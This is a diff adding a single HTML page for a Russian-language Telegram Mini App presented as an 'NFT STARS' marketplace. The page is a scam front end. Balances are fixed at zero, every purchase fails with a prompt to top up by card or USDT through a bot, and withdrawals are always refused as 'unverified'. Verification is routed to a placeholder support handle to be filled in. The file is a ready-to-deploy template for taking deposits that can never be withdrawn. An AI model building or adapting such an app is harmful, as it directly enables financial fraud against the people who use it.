@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>NFT Marketplace App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --bg: #111111; --card-bg: #1c1c1c; --text: #ffffff; --accent: #0088cc; --green: #4caf50; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 15px; -webkit-user-select: none; }
+        .card { background: var(--card-bg); border-radius: 16px; padding: 15px; margin-bottom: 15px; border: 1px solid #333; }
+        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .nft-item { background: var(--card-bg); border-radius: 12px; padding: 10px; text-align: center; border: 1px solid #222; }
+        .nft-item img { width: 100%; border-radius: 8px; margin-bottom: 8px; }
+        .price { color: var(--green); font-weight: bold; margin: 8px 0; }
+        .btn { background: var(--accent); color: white; border: none; padding: 10px; width: 100%; border-radius: 10px; font-weight: 600; cursor: pointer; }
+        .btn-wallet { background: #333; margin-top: 10px; }
+        
+        /* Вкладки */
+        .tab-content { display: none; }
+        .tab-content.active { display: block; animation: fadeIn 0.2s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Навигация */
+        .nav { position: fixed; bottom: 0; left: 0; width: 100%; background: #181818; display: flex; border-top: 1px solid #333; padding: 10px 0; padding-bottom: 25px; }
+        .nav-item { flex: 1; text-align: center; color: #666; font-size: 11px; cursor: pointer; }
+        .nav-item.active { color: var(--accent); }
+        .nav-icon { font-size: 20px; display: block; margin-bottom: 4px; }
+    </style>
+</head>
+<body>
+
+<div id="market" class="tab-content active">
+    <h2 style="text-align: center;">✨ NFT STARS</h2>
+    <div class="nft-grid">
+        <div class="nft-item">
+            <div style="font-size: 40px;">⭐</div>
+            <div>Звезда 100</div>
+            <div class="price">100.00 $</div>
+            <button class="btn" onclick="buy('Звезда 100', 100)">Купить</button>
+        </div>
+        <div class="nft-item">
+            <div style="font-size: 40px;">🌟</div>
+            <div>Звезда 500</div>
+            <div class="price">500.00 $</div>
+            <button class="btn" onclick="buy('Звезда 500', 500)">Купить</button>
+        </div>
+        <div class="nft-item">
+            <div style="font-size: 40px;">💫</div>
+            <div>Звезда 1000</div>
+            <div class="price">1000.00 $</div>
+            <button class="btn" onclick="buy('Звезда 1000', 1000)">Купить</button>
+        </div>
+        <div class="nft-item">
+            <div style="font-size: 40px;">💎</div>
+            <div>Звезда 1500</div>
+            <div class="price">1500.00 $</div>
+            <button class="btn" onclick="buy('Звезда 1500', 1500)">Купить</button>
+        </div>
+    </div>
+</div>
+
+<div id="profile" class="tab-content">
+    <h2>👤 Профиль</h2>
+    <div class="card">
+        <p>Пользователь: <b id="u-name">Загрузка...</b></p>
+        <p>ID: <span id="u-id">---</span></p>
+        <hr style="border: 0.1px solid #333;">
+        <p>Баланс: <b class="price">0.00 $</b></p>
+        <p>Статус: <span style="color: #ff4d4d;">Не верифицирован</span></p>
+        <button class="btn" onclick="tg.showAlert('Для прохождения верификации обратитесь в поддержку @Ваш_Ник')">Пройти верификацию</button>
+    </div>
+</div>
+
+<div id="wallet" class="tab-content">
+    <h2>💳 Кошелек</h2>
+    <div class="card">
+        <h3>Пополнение счета</h3>
+        <button class="btn" style="background: #4caf50;" onclick="sendToBot('pay_card')">Карта RU/MIR</button>
+        <button class="btn" style="background: #f39c12; margin-top: 10px;" onclick="sendToBot('pay_crypto')">USDT (TRC-20)</button>
+    </div>
+    <div class="card">
+        <h3>Вывод средств</h3>
+        <p style="font-size: 13px; color: #888;">Минимальная сумма вывода: 50.00 $</p>
+        <button class="btn btn-wallet" onclick="tg.showAlert('Ошибка: Вывод доступен только верифицированным пользователям.')">Вывести на карту</button>
+    </div>
+</div>
+
+<div class="nav">
+    <div class="nav-item active" onclick="showTab('market', this)"><span class="nav-icon">🛒</span>Маркет</div>
+    <div class="nav-item" onclick="showTab('profile', this)"><span class="nav-icon">👤</span>Кабинет</div>
+    <div class="nav-item" onclick="showTab('wallet', this)"><span class="nav-icon">💳</span>Кошелек</div>
+</div>
+
+<script>
+    let tg = window.Telegram.WebApp;
+    tg.expand();
+    
+    // Подгрузка данных юзера
+    const user = tg.initDataUnsafe.user;
+    if (user) {
+        document.getElementById('u-name').innerText = user.first_name;
+        document.getElementById('u-id').innerText = user.id;
+    }
+
+    function showTab(id, el) {
+        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        el.classList.add('active');
+    }
+
+    function buy(name, price) {
+        tg.showConfirm(`Вы подтверждаете покупку ${name} за ${price}$?`, (ok) => {
+            if(ok) tg.showAlert("Ошибка: Недостаточно средств. Пополните баланс в разделе Кошелек.");
+        });
+    }
+
+    function sendToBot(action) {
+        tg.sendData(action); // Отправляет текст боту
+        tg.close(); // Закрывает приложение после выбора
+    }
+</script>
+</body>
+</html>
